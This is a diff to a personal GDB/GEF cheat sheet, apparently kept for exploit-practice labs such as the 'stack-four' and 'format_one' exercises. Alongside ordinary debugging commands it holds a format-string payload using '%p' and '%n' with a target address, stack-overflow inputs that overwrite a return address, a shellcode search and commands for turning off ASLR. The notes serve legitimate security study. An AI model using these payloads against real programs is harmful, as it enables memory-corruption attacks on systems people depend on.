@@ -1,6 +1,7 @@
 # GDB
-
 ### Getting started
+##### Install the gef extension
+`https://gef.readthedocs.io/en/master/#setup`
 ##### gdb version
 `show version`
 ##### From command line
@@ -21,9 +22,7 @@
 `gdb -batch -ex 'file format_one' -ex 'disassemble main'`
 ##### Disassemble and look for compare instructions
 `gdb -batch -ex 'file format_one' -ex 'disassemble main' | grep -i cmp`
-### Make gdb better
-##### Install gef
-`https://gef.readthedocs.io/en/master/#setup`
+
 ### Set
 ##### Integer
 `set $foo = 3`
@@ -196,7 +195,7 @@ $7 = 0xb7ffd020
 ```
 (gdb) ptype /o struct locals
 ```
-### Understanding a Stack
+### Buffers
 ##### Find size of buffer ( memset )
 `disassemble main` and find useful `apis`.  For example, if `memset` is called:
 
@@ -230,29 +229,32 @@ strncpy@plt (
 )
 ```
 That re-confirms the address of the buffer and it's length of `256` characters.
-##### Breakpoint fires
-Get target memory from `memset` argument one or you can find the `Frame Pointer` and subtract the size of the `buffer` like this: `p/x $rbp - 0x100`
+
 ##### Target register
-`0x00007fffffffe350`
-##### Run a buffer filling payload
-`run $(python -c 'print "\x41"*252 + "\x54\x10\x60\x00" + "%n"')`
-##### Watch memory
-`memory watch p/x $rbp - 0x100 10 qword`
+`0x00007fffffffe440`
+##### Watch buffer
+`memory watch p/x 0x00007fffffffe440 10 qword`
 ##### Print each byte
-`x/256bx 0x00007fffffffe350`
+`x/256bx 0x00007fffffffe440`
 ##### Print only the buffer
-`x/64wx 0x00007fffffffe350`
-##### Get stack size
-`set $stack_size = $rbp - $rsp`         # 272
-##### Calculate max overflow
-`p/d $stack_size -256`                  # 16
-##### Print stack
-`x/272wx $rsp`
-##### Result
-`AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA?@Better luck next time!`
+`x/64wx 0x00007fffffffe440`
+
 
 ### Buffer filling
-Useful when trying to overfill a buffer with `gets` / `strcpy` or an `environment variable`
+#### argv[1]
+##### Prepare input outside of debugger ( and reverse bytes )
+`python -c 'print "\x08\x04\xa0\x30"[::-1] + "%p"*14 + "%n"' > change_me_bytes.hex`
+##### Check the bytes
+```
+# xxd change_me_bytes.hex
+00000000: 30a0 0408 2570 2570 2570 2570 2570 2570  0...%p%p%p%p%p%p
+00000010: 2570 2570 2570 2570 2570 2570 2570 2570  %p%p%p%p%p%p%p%p
+00000020: 256e 0a                                  %n.
+```
+##### Inside of gdb
+`run $(cat change_me_bytes.hex)`
+
+##### Overfill a buffer with gets() or strcpy() or Environment Variable
 ```
 $ python -c 'print "A"*(80) + "\x44\x05\x01\x00"' | ./stack-four
 $ cat ~/128chars | ./stack-five
@@ -281,9 +283,9 @@ When you hit a non-readable ASCII character. Reference [here][ba369178].
 
   [ba369178]: https://stackoverflow.com/questions/42884251/why-is-the-output-of-print-in-python2-and-python3-different-with-the-same-string "python_2_and_3_byte_differences"
 
-#### Sections
+### Understanding where you are
 `main info sec`
-#### whatis
+##### whatis
 ```
 gef> whatis 0x000106d8
 type = int
@@ -323,12 +325,19 @@ gef> set env FooBarEnvVariables=`perl -e 'print "A" x 65'`
 gef> x/s *((char **)environ)
 0xfffefed4:	"LS_COLORS="
 ```
-#### Registers
+### Registers
 ```
 reg
 info registers
 ```
-#### Memory
+### Stack
+##### Get stack size
+`set $stack_size = $rbp - $rsp`         # 272
+##### Calculate max overflow
+`p/d $stack_size -256`                  # 16
+##### Print stack
+`x/272wx $rsp`
+### Memory
 ```
 gef> x/100wx $sp-200     // check overflowed Stack
 
@@ -358,6 +367,30 @@ $10 = 84
 gef> p/u 0xfffefd74 - 0xfffefd20
 $11 = 84
 ```
+### Rat Holes
+##### Careful not to mix frames!
+When debugging, it is important to be aware of what frame you are in. I created a rat hole by mixing frames.  This is how I went down the rat hole:
+
+I was running in the `main frame`:
+```
+p/x $rbp - 0x100
+$5 = 0x7fffffffe410
+```
+I then used the same shortcut.  But I was inside another `frame`:
+```
+p/x $rbp - 0x100
+0x7fffffffe300
+```
+
+##### Special characters
+Any of the following characters in a memory address could cause a C API to choke when it tried to write to the address:
+
+    - \x00 (Null)
+    - \x09 (Tab)
+    - \x0a (New line)
+    - \x0d (Carriage return)
+    - \x20 (Space)
+
 #### GEF commands
 ```
 gef> shellcode search linux arm
@@ -419,6 +452,10 @@ https://stackoverflow.com/questions/2462317/bash-syntax-error-redirection-unexpe
 ### Cool commands
 ##### what is the current instruction
 `where`
+##### Set architecture to 32 bit Intel machine
+`set architecture i386`
+##### Set architecture to Auto
+`set architecture auto`
 ##### disable ASLR in host machine
 `sysctl -w kernel.randomize_va_space=0`   // whoami=root
 ##### disable ASLR
